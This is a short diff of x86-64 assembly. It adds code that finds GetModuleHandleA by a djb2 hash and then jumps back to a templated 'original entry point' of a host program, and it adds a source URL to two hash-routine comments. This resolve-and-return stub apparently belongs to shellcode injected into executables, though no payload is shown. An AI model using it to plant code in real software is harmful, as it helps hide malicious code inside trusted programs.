@@ -63,9 +63,23 @@ main:
 
 		call rax
 
+		mov rdx, 0x5a153f58
+		mov rcx, [rbp - 0x20]
+		call getFunction		; Find GetModuleHandleA
+		
+		mov rcx, 0
+		call rax
+		add rax, %d				; original entry point goes here
+		add rsp, 0xb0
+		pop rbp
+		push rax
+		ret
+
+
+
 	
 calHashWchar:
-	; djb2 hashing algorithm
+	; djb2 hashing algorithm: http://www.cse.yorku.ca/~oz/hash.html
 	push rbp
 	mov rbp, rsp
 	sub rsp, 0x18
@@ -97,7 +111,7 @@ calHashWchar:
 		ret
 
 calHashChar:
-	; djb2 hashing algorithm
+	; djb2 hashing algorithm: http://www.cse.yorku.ca/~oz/hash.html
 	push rbp
 	mov rbp, rsp
 	sub rsp, 0x18
